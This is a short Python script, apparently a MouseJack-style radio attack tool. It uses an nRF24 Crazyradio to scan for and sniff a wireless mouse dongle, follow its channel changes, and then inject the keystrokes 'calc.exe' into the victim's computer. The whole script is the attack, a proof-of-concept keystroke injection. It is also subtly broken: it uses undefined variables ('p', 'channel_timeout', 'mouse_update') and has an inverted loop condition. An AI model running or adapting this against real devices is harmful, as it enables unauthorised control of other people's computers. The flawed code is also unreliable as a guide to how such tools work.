#!/usr/bin/env python

import time, logging, scanner, hid
from lib import nrf24

logging.basicConfig(level=logging.INFO, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

attack = "calc.exe\n"

# Initialize the radio
radio = nrf24.nrf24(0)

# Assume Crazyradio PA
radio.enable_lna()

# Create scanner instance
scan = scanner.scanner(radio)

# Channel timeout in seconds
timeout = 0.1
sniff_timeout = 1.0

# Enter main loop
while True:
  address, payload = scan.scan()

  if len(payload) == 19 and p[1] == 0x90:

    last_ping = time.time()
    last_packet = time.time()
    scan.sniffer(address)
    mouse = hid.mouse(radio, address)
    mouse.update(payload)

    while time.time() - last_packet > sniff_timeout:
      
      # Follow the target device if it changes channels
      if time.time() - last_ping > channel_timeout and mouse.pingable:
        if scan.follow():
          last_ping = time.time()

      # Receive payloads
      value = radio.receive_payload()
      if value[0] == 0:

        # Reset the follow timer
        last_ping = time.time()

        if len(payload) == 19 and p[1] == 0x90:
          
          # Reset the packet timer
          last_packet = time.time()

          # Split the payload from the status byte
          payload = value[1:]

          # Update the payload
          mouse_update(payload)
    
    mouse.send_attack(attack)

